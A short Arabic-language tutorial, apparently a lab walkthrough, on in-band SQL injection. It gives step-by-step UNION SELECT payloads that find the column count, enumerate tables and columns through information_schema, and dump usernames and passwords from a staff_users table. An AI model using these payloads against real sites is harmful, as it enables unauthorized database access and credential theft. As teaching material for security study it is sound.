# SQL injection

<details>
   <summary> in-band SQLI </summary>

🧪 الجزء العملي - خطوة بخطوة
1. اكتشاف الثغرة:
افتح المتصفح، وروح للرابط اللي فيه id=1.

جرب تحط ' بعد الرقم كده:


```
id=1'
```
هتلاقي رسالة خطأ ظهرت.
ده معناه إن المدخل بتاعك داخل فعلاً جوه استعلام SQL، وده تأكيد إن فيه ثغرة.

2. نبدأ نستغلها بـ UNION
جرب كده:

```
id=1 UNION SELECT 1
```
هتلاقي رسالة خطأ بتقولك إن عدد الأعمدة مش متطابق.

جرب تزود الأعمدة:
```
id=1 UNION SELECT 1,2
```
لسه في Error؟ زود كمان:

```
id=1 UNION SELECT 1,2,3
```
كده اشتغل! ليه؟ لأن الاستعلام الأصلي بيرجع 3 أعمدة، فلازم الاتحاد يكون بنفس العدد.

3. نخلي الـ UNION يشتغل لوحده
يعني نمنع الاستعلام الأصلي من إرجاع نتيجة.

اعمل id=0 بدلاً من 1:
```
id=0 UNION SELECT 1,2,3
```
كده الصفحة هتعرض النتائج اللي انت رجعتها.

4. نعرض اسم قاعدة البيانات:
```
id=0 UNION SELECT 1,2,database()
```
هيظهر لك اسم قاعدة البيانات، مثلاً: sqli_one.

5. نعرض أسماء الجداول داخل قاعدة البيانات:
```
id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
النتيجة:
```
article,staff_users
```

يبقى فيه جدول اسمه staff_users ده غالبًا فيه اليوزرز.

6. نعرف أسماء الأعمدة داخل جدول staff_users:
```
id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```
النتيجة:
```
id,username,password
```

7. نجيب اليوزرات والباسوردات:
```
id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
هتلاقي النتائج بتظهر كده:

```
martin:123456
admin:qwerty
```


  
</details>
